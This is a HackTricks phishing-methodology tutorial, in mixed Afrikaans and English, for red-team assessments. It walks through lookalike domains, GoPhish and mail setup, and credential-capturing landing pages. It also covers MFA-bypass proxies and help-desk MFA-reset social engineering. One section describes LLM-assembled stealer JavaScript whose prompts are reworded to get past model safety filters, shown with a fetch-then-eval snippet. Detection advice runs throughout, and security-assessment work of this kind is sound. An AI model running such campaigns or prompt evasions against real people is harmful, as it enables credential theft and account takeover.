# Phishing Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Metodologie

1. Recon die slagoffer
1. Kies die **victim domain**.
2. Voer basiese web-ontleding uit deur **searching for login portals** wat deur die slagoffer gebruik word en **decide** watteren jy gaan **impersonate**.
3. Gebruik `OSINT` om **find emails**.
2. Berei die omgewing voor
1. **Buy the domain** wat jy gaan gebruik vir die phishing assessment
2. **Configure the email service** verwante rekords (SPF, DMARC, DKIM, rDNS)
3. Konfigureer die VPS met **gophish**
3. Berei die campaign voor
1. Berei die **email template** voor
2. Berei die **web page** voor om die inlogbewyse te steel
4. Begin die veldtog!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: Die domeinnaam **contains** 'n belangrike **keyword** van die oorspronklike domein (e.g., zelster.com-management.com).
- **hypened subdomain**: Verander die **dot for a hyphen** van 'n subdomain (e.g., www-zelster.com).
- **New TLD**: Dieselfde domein met 'n **new TLD** (e.g., zelster.org)
- **Homoglyph**: Dit **replaces** 'n letter in die domeinnaam met **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Dit **swaps two letters** binne die domeinnaam (e.g., zelsetr.com).
- **Singularization/Pluralization**: Voeg 's' by of verwyder dit van die einde van die domeinnaam (e.g., zeltsers.com).
- **Omission**: Dit **removes one** van die letters uit die domeinnaam (e.g., zelser.com).
- **Repetition:** Dit **repeats one** van die letters in die domeinnaam (e.g., zeltsser.com).
- **Replacement**: Soos homoglyph maar minder slinks. Dit vervang een van die letters in die domeinnaam, miskien met 'n letter wat naby die oorspronklike letter op die sleutelbord lê (e.g, zektser.com).
- **Subdomained**: Voer 'n **dot** in binne die domeinnaam in (e.g., ze.lster.com).
- **Insertion**: Dit **inserts a letter** in die domeinnaam (e.g., zerltser.com).
- **Missing dot**: Voeg die TLD by die domeinnaam. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Daar is 'n **possibility that one of some bits stored or in communication might get automatically flipped** weens verskeie faktore soos sonvlamme, kosmiese strale, of hardewarefoute.

Wanneer hierdie konsep op DNS-versoeke toegepas word, is dit moontlik dat die **domain received by the DNS server** nie dieselfde is as die domein wat aanvanklik versoek is nie.

Byvoorbeeld, 'n enkele bit-wysiging in die domein "windows.com" kan dit verander na "windnws.com."

Aanvallers kan **take advantage of this by registering multiple bit-flipping domains** wat soortgelyk is aan die slagoffer se domein. Hul bedoeling is om wettige gebruikers na hul eie infrastruktuur om te lei.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

Jy kan in [https://www.expireddomains.net/](https://www.expireddomains.net) soek vir 'n vervalde domein wat jy kan gebruik.\
Om seker te maak dat die vervalde domein wat jy gaan koop **has already a good SEO** het, kan jy kyk hoe dit gekategoriseer is in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Om meer geldige e-posadresse te ontdek of diegene wat jy reeds ontdek het te verifieer, kan jy nagaan of jy die smtp-servers van die slagoffer kan brute-force. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Verder, moenie vergeet dat as gebruikers **any web portal to access their mails** gebruik nie, jy kan kyk of dit kwesbaar is vir **username brute force**, en die kwesbaarheid benut as dit moontlik is.

## Configuring GoPhish

### Installasie

Jy kan dit aflaai vanaf [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Laai dit af en pak dit uit binne `/opt/gophish` en voer `/opt/gophish/gophish` uit.\
Jy sal 'n wagwoord vir die admin user op port 3333 in die uitset ontvang. Toegang daartoe en gebruik daardie credentials om die admin-wagwoord te verander. Jy mag nodig hê om daardie poort na lokaal te tunnel:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Konfigurasie

**TLS-sertifikaatkonfigurasie**

Voor hierdie stap moet jy **reeds die domein gekoop hê** wat jy gaan gebruik en dit moet **wys** na die **IP van die VPS** waar jy **gophish** konfigureer.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mailkonfigurasie**

Begin installasie: `apt-get install postfix`

Voeg dan die domein by die volgende lêers:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Verander ook die waardes van die volgende veranderlikes binne /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Wysig uiteindelik die lêers **`/etc/hostname`** en **`/etc/mailname`** na jou domeinnaam en **herbegin jou VPS.**

Skep nou 'n **DNS A record** van `mail.<domain>` wat wys na die **ip address** van die VPS en 'n **DNS MX** record wat wys na `mail.<domain>`

Kom ons toets nou deur 'n e-pos te stuur:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish konfigurasie**

Stop die uitvoering van gophish en kom ons konfigureer dit.\
Wysig `/opt/gophish/config.json` na die volgende (let op die gebruik van https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Konfigureer gophish diens**

Om die gophish diens te skep sodat dit outomaties begin kan word en as 'n diens bestuur kan word, kan jy die lêer `/etc/init.d/gophish` skep met die volgende inhoud:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Voltooi die konfigurasie van die diens en kontroleer dit deur die volgende te doen:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Konfigureer e-posbediener en domein

### Wag & wees geloofwaardig

Hoe ouer 'n domein is, hoe minder waarskynlik is dit dat dit as spam gevang sal word. Jy moet dus soveel moontlik wag (ten minste 1 week) voor die phishing-assessering. Verder, as jy 'n bladsy oor 'n reputasiese sektor plaas, sal die verkrygde reputasie beter wees.

Let daarop dat selfs al moet jy 'n week wag, kan jy alles nou klaar konfigureer.

### Configure Reverse DNS (rDNS) record

Stel 'n rDNS (PTR) rekord in wat die IP-adres van die VPS na die domeinnaam oplos.

### Sender Policy Framework (SPF) Record

Jy moet **'n SPF rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n SPF rekord is nie [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Jy kan [https://www.spfwizard.net/](https://www.spfwizard.net) gebruik om jou SPF-beleid te genereer (gebruik die IP van die VPS-masjien)

![](<../../images/image (1037).png>)

Dit is die inhoud wat in 'n TXT-rekord binne die domein gestel moet word:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domein-gebaseerde boodskapverifikasie, verslaggewing en konformiteit (DMARC) Rekord

Jy moet **'n DMARC-rekord vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC-rekord is nie, [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Jy moet 'n nuwe DNS TXT-rekord skep wat na die gasheernaam `_dmarc.<domain>` wys met die volgende inhoud:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Jy moet **'n DKIM vir die nuwe domein konfigureer**. As jy nie weet wat 'n DMARC rekord is nie [**lees hierdie bladsy**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Jy moet beide B64-waardes wat die DKIM-sleutel genereer, aanmekaar sit:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Toets jou e-poskonfigurasie se telling

Jy kan dit doen met [https://www.mail-tester.com/](https://www.mail-tester.com/)\  
Gaan net na die bladsy en stuur 'n e-pos na die adres wat hulle jou gee:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Jy kan ook **jou e-poskonfigurasie nagaan** deur 'n e-pos te stuur na `check-auth@verifier.port25.com` en **die reaksie te lees** (hiervoor sal jy poort **25** moet **oopmaak** en die reaksie sien in die lêer _/var/mail/root_ as jy die e-pos as root stuur).\
Maak seker dat jy al die toetse slaag:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Jy kan ook 'n **boodskap na 'n Gmail-rekening wat jy beheer** stuur, en die **e-pos se headers** in jou Gmail-inkassie nagaan; `dkim=pass` behoort in die `Authentication-Results` header-veld teenwoordig te wees.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Verwyder uit Spamhouse Blacklist

Die bladsy [www.mail-tester.com](https://www.mail-tester.com) kan aandui of jou domain geblokkeer word deur spamhouse. Jy kan versoek dat jou domain/IP verwyder word by: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Verwyder uit Microsoft Blacklist

​​Jy kan versoek dat jou domain/IP verwyder word by [https://sender.office.com/](https://sender.office.com).

## Skep & Begin GoPhish Campaign

### Sending Profile

- Stel 'n **naam om te identifiseer** vir die sender profiel
- Bepaal vanaf watter rekening jy die phishing e-posse gaan stuur. Voorstelle: _noreply, support, servicedesk, salesforce..._
- Jy kan username en password leeg laat, maar maak seker om die "Ignore Certificate Errors" aan te merk

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Dit word aanbeveel om die "**Send Test Email**" funksionaliteit te gebruik om te toets dat alles werk.\
> Ek beveel aan om die **test emails** na 10min mail-adresse te stuur om te voorkom dat jy blacklisted raak tydens toetse.

### Email Template

- Stel 'n **naam om te identifiseer** vir die template
- Skryf 'n **subject** (niks vreemds, net iets wat jy sou verwag om in 'n gewone e-pos te lees)
- Maak seker jy het gekies "**Add Tracking Image**"
- Skryf die **email template** (jy kan veranderlikes gebruik soos in die volgende voorbeeld):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Let daarop dat **om die geloofwaardigheid van die e-pos te verhoog**, dit aanbeveel word om 'n handtekening van 'n e-pos van die kliënt te gebruik. Voorstelle:

- Stuur 'n e-pos na 'n **nie-bestaande adres** en kyk of die reaksie enige handtekening het.
- Soek vir **publieke e-posse** soos info@ex.com of press@ex.com of public@ex.com en stuur hulle 'n e-pos en wag vir die reaksie.
- Probeer om **kontak te maak met 'n geldige ontdekte** e-pos en wag vir die reaksie

![](<../../images/image (80).png>)

> [!TIP]
> Die Email Template laat jou ook toe om **lêers aan te heg om te stuur**. As jy ook NTLM-challenges wil steel deur sommige spesiaal vervaardigde lêers/dokumente te gebruik [lees hierdie blad](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Skryf 'n **naam**
- **Skryf die HTML-kode** van die webblad. Let daarop dat jy webbladsye kan **invoer/import**.
- Merk **Capture Submitted Data** en **Capture Passwords**
- Stel 'n **omleiding** in

![](<../../images/image (826).png>)

> [!TIP]
> Gewoonlik sal jy die HTML-kode van die blad moet wysig en sommige toetse plaaslik doen (miskien deur 'n Apache-bediener te gebruik) **totdat jy tevrede is met die resultate.** Dan plak daardie HTML-kode in die boks.\
> Let daarop dat as jy sommige statiese hulpbronne vir die HTML nodig het (miskien sommige CSS en JS-bladsye) kan jy dit stoor in _**/opt/gophish/static/endpoint**_ en dan toegang daartoe kry vanaf _**/static/\<filename>**_

> [!TIP]
> Vir die omleiding kan jy die gebruikers **herlei na die legit hooff webblad** van die slagoffer, of hulle herlei na _/static/migration.html_ byvoorbeeld, sit 'n **spinning wheel (**[**https://loading.io/**](https://loading.io)**) vir 5 sekondes en gee dan aan dat die proses suksesvol was**.

### Users & Groups

- Stel 'n naam in
- **Import die data** (let daarop dat om die sjabloon vir die voorbeeld te gebruik jy die firstname, last name en email address van elke gebruiker nodig het)

![](<../../images/image (163).png>)

### Campaign

Skep uiteindelik 'n campaign deur 'n naam, die email template, die landing page, die URL, die sending profile en die groep te kies. Let daarop dat die URL die skakel sal wees wat aan die slagoffers gestuur word

Let daarop dat die **Sending Profile toelaat om 'n toets-e-pos te stuur om te sien hoe die finale phishing e-pos sal lyk**:

![](<../../images/image (192).png>)

> [!TIP]
> Ek sou aanbeveel om **die toets-e-posse na 10min mails adresse te stuur** om te voorkom dat jy ge-blacklist word tydens toetse.

Sodra alles gereed is, begin net die campaign!

## Website Cloning

As jy om enige rede die webwerf wil kloon, kyk na die volgende blad:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In sommige phishing-assesserings (hoofsaaklik vir Red Teams) sal jy ook wil **lêers stuur wat 'n soort backdoor bevat** (miskien 'n C2 of miskien net iets wat 'n autentikasie sal aktiveer).\
Kyk na die volgende blad vir sommige voorbeelde:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Die vorige aanval is redelik slim aangesien jy 'n ware webwerf naboots en die inligting wat deur die gebruiker ingevoer is versamel. Ongelukkig, as die gebruiker nie die korrekte wagwoord ingevoer het nie of as die toepassing wat jy nageboots het met 2FA gekonfigureer is, **sal hierdie inligting jou nie toelaat om die mislei gebruiker te imiteer nie**.

Dit is waar instrumente soos [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) en [**muraena**](https://github.com/muraenateam/muraena) nuttig is. Hierdie gereedskap laat jou toe om 'n MitM-agtige aanval te genereer. Basies werk die aanval op die volgende manier:

1. Jy **naboots die login** vorm van die werklike webblad.
2. Die gebruiker **stuur** sy **credentials** na jou vals blad en die instrument stuur dit na die werklike webblad, **kontroleer of die credentials werk**.
3. As die rekening met **2FA** gekonfigureer is, sal die MitM-blad daarvoor vra en sodra die **gebruiker dit invoer** sal die instrument dit na die werklike webblad stuur.
4. Sodra die gebruiker geverifieer is, sal jy (as aanvaller) **die credentials, die 2FA, die cookie en enige inligting** van elke interaksie gevang hê terwyl die instrument die MitM uitvoer.

### Via VNC

Wat as jy in plaas daarvan om die slagoffer na 'n kwaadwillige blad te stuur wat dieselfde voorkoms as die oorspronklike het, hom na 'n **VNC-sessie met 'n blaaier gekoppel aan die werklike webblad** stuur? Jy sal kan sien wat hy doen, die wagwoord steel, die MFA wat gebruik is, die cookies...\
Jy kan dit doen met [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Ondersoek jou domein in swartlyste is een van die beste maniere om uit te vind of jy betrap is. As dit gelys is, is jou domein op een of ander manier as verdag aangeteken.\
Een maklike manier om te kontroleer of jou domein in enige swartlys verskyn is om [https://malwareworld.com/](https://malwareworld.com) te gebruik

Daar is egter ander maniere om te weet of die slagoffer **aktief soek na verdagte phishing-aktiwiteit in die wild**, soos verduidelik in:


{{#ref}}
detecting-phising.md
{{#endref}}

Jy kan **'n domein koop met 'n baie soortgelyke naam** aan die slagoffer se domein **en/of 'n sertifikaat genereer** vir 'n **subdomain** van 'n domein wat deur jou beheer word **wat die sleutelwoord van die slagoffer se domein bevat**. As die **slagoffer** enige soort **DNS- of HTTP-interaksie** met hulle uitvoeren, sal jy weet dat **hy aktief soek** na verdagte domeine en jy sal baie skugter moet wees.

### Evalueer die phishing

Gebruik [**Phishious** ](https://github.com/Rices/Phishious) om te evalueer of jou e-pos in die spam-lêer gaan eindig of as dit geblokkeer of suksesvol sal wees.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Moderne indringingsgroepe slaan toenemend e-pos-lokvalle oor en rig hul aanvalle direk op die service-desk / identity-recovery werkvloei om MFA te omseil. Die aanval is volledig "living-off-the-land": sodra die operateur geldige credentials besit, beweeg hulle met ingeboude admin hulpmiddels – geen malware is nodig nie.

### Attack flow
1. Recon van die slagoffer
* Versamel persoonlike & korporatiewe besonderhede van LinkedIn, data breaches, openbare GitHub, ens.
* Identifiseer hoë-waarde identiteite (uitvoerende beamptes, IT, finansies) en enumereer die **presiese help-desk proses** vir wagwoord / MFA-reset.
2. Real-time social engineering
* Bel, Teams of chat die help-desk terwyl jy die teiken naboots (dikwels met **gespoofde caller-ID** of **gekloon stem**).
* Verskaf die vooraf-versamelde PII om kennis-gebaseerde verifikasie te slaag.
* Oortuig die agent om die **MFA-secret te reset** of 'n **SIM-swap** op 'n geregistreerde mobiele nommer uit te voer.
3. Onmiddellike post-access aksies (≤60 min in regte gevalle)
* Vestig 'n voetspoor deur enige web SSO portaal.
* Enumereer AD / AzureAD met ingeboude hulpmiddels (geen binaries word gedrop nie):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Laterale beweging met **WMI**, **PsExec**, of wettige **RMM** agents wat reeds in die omgewing op die witlys is.

### Detection & Mitigation
* Behandel help-desk identity recovery as 'n **privileged operation** – vereis step-up auth & bestuurder goedkeuring.
* Ontplooi **Identity Threat Detection & Response (ITDR)** / **UEBA** reëls wat waarsku op:
* MFA metode verander + autentikasie vanaf nuwe toestel / geo.
* Onmiddellike opgradering van dieselfde prinsipaak (user-→-admin).
* Neem help-desk oproepe op en dwing 'n **call-back na 'n reeds-geregistreerde nommer** voor enige reset.
* Implementeer **Just-In-Time (JIT) / Privileged Access** sodat nuut-geresette rekeninge nie outomaties hoë-privilegie tokens erf nie.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity-bendes vergoed die koste van high-touch operasies met massale aanvalle wat **search engines & ad networks in die afleweringskanaal omskep**.

1. **SEO poisoning / malvertising** druk 'n vals resultaat soos `chromium-update[.]site` na die top soekadvertensies.
2. Slagoffer laai 'n klein **first-stage loader** af (dikwels JS/HTA/ISO). Voorbeelde deur Unit 42 waargeneem:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltreer blaaier cookies + credential DBs, en laai dan 'n **stilswyende loader** wat in realtime besluit of dit moet ontplooi:
* RAT (bv. AsyncRAT, RustDesk)
* ransomware / wiper
* persistentie komponent (registry Run key + scheduled task)

### Hardening tips
* Blokkeer pas geregistreerde domeine & dwing **Advanced DNS / URL Filtering** op *search-ads* sowel as e-pos.
* Beperk sagteware-installasie tot getekende MSI / Store pakkette, keer `HTA`, `ISO`, `VBS` uitvoering deur beleid.
* Monitor vir child processes van blaaiers wat installers open:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Jaag LOLBins wat gereeld deur first-stage loaders misbruik word (bv. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Aanvallers ketting nou **LLM & voice-clone APIs** vir volledig gepersonaliseerde lokvalle en real-time interaksie.

| Laag | Voorbeeldgebruik deur bedreigingsakteur |
|-------|-----------------------------|
|Automatisering|Genereer & stuur >100 k e-posse / SMS met gerandomiseerde woordestryke & tracking-skakels.|
|Genererende AI|Skep eenmalige e-posse wat verwys na openbare M&A, binnenshuise grappies van sosiale media; deep-fake CEO-stem in callback-bedrog.|
|Agentgebaseerde AI|Registreer outonomies domeine, skraap open-source intel, ontwerp volgende fase e-posse wanneer 'n slagoffer klik maar nie credentials invul nie.|

**Verdediging:**
• Voeg **dynamiese banners** by wat boodskappe uitlig wat deur onbetroubare outomasie gestuur is (via ARC/DKIM anomalieë).
• Ontplooi **voice-biometric challenge phrases** vir hoë-risiko telefoonversoeke.
• Simuleer deurlopend AI-gegenereerde lokvalle in bewustheidsprogramme – statiese sjablone is verouderd.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Aanvallers kan skynbaar onskadelike HTML stuur en die **stealer tydens runtime genereer** deur 'n **betroubare LLM API** vir JavaScript te vra, en dit dan in-die-blaaier uit te voer (bv. `eval` of dinamiese `<script>`).

1. **Prompt-as-obfuscation:** enkodeer exfil URLs/Base64 stringe in die prompt; iterereer woordkeuse om veiligheidsfilters te omseil en hallucinasies te verminder.
2. **Client-side API call:** op laai, roep JS 'n publieke LLM (Gemini/DeepSeek/etc.) of 'n CDN-proxy; slegs die prompt/API-aanroep is in die statiese HTML teenwoordig.
3. **Assemble & exec:** konkateneer die reaksie en voer dit uit (polimorfies per besoek):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** gegenereerde kode personaliseer die aas (bv. LogoKit token parsing) en stuur creds na die prompt-hidden endpoint.

**Ontduikingseienskappe**
- Verkeer tref goedbekende LLM-domeine of betroubare CDN-proxies; soms via WebSockets na 'n backend.
- Geen statiese payload; kwaadwillige JS bestaan slegs ná render.
- Nie-deterministiese generasies produseer **unieke** stealers per sessie.

**Opsporingsidees**
- Voer sandkaste uit met JS geaktiveer; merk **runtime `eval`/dynamic script creation sourced from LLM responses** aan.
- Soek na front-end POSTs na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggegewe teks.
- Stel 'n waarskuwing op vir nie-goedgekeurde LLM-domeine in kliëntverkeer tesame met daaropvolgende credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Benewens klassieke push-bombing, dwing operateurs eenvoudigweg **force a new MFA registration** tydens die help-desk-oproep, wat die gebruiker se bestaande token nietig maak. Enige daaropvolgende login prompt lyk legitiem vir die victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Hou dop vir AzureAD/AWS/Okta-gebeure waar **`deleteMFA` + `addMFA`** binne enkele minute vanaf dieselfde IP plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan stilweg kwaadwillige opdragte in die slagoffer se clipboard kopieer vanaf 'n gekompromitteerde of typosquatted web page en dan die gebruiker mislei om dit in **Win + R**, **Win + X** of 'n terminalvenster te plak, wat willekeurige kode uitvoer sonder enige aflaai of aangeheg.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateurs plaas toenemend hul phishing-vloeie agter 'n eenvoudige toestelkontrole sodat desktop crawlers nooit die finale bladsye bereik nie. 'n Algemene patroon is 'n klein skrip wat toets vir 'n touch-capable DOM en die resultaat na 'n server endpoint stuur; nie‑mobiele kliënte ontvang HTTP 500 (of 'n leë bladsy), terwyl mobiele gebruikers die volledige vloei ontvang.

Minimale kliëntfragment (tipiese logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (vereenvoudigde):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Bediener‑gedrag wat gereeld waargeneem word:
- Stel tydens die eerste laai 'n sessiekoekie.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of 'n plaatshouer) op opvolgende GETs wanneer `is_mobile=false`; dien phishing slegs as `true`.

Jag- en opsporingsheuristieke:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web-telemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie‑mobiele toestelle; regte mobiele gebruikerspaaie lewer 200 met opvolgende HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik afhanklik maak van `ontouchstart` of soortgelyke toestelkontroles.

Verdedigingswenke:
- Voer crawlers uit met mobiele-agtige fingerprints en JS aangeskakel om toegangsbeperkte inhoud te openbaar.
- Waarsku vir verdagte 500-antwoorde na `POST /detect` op pas geregistreerde domeine.

## Verwysings

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
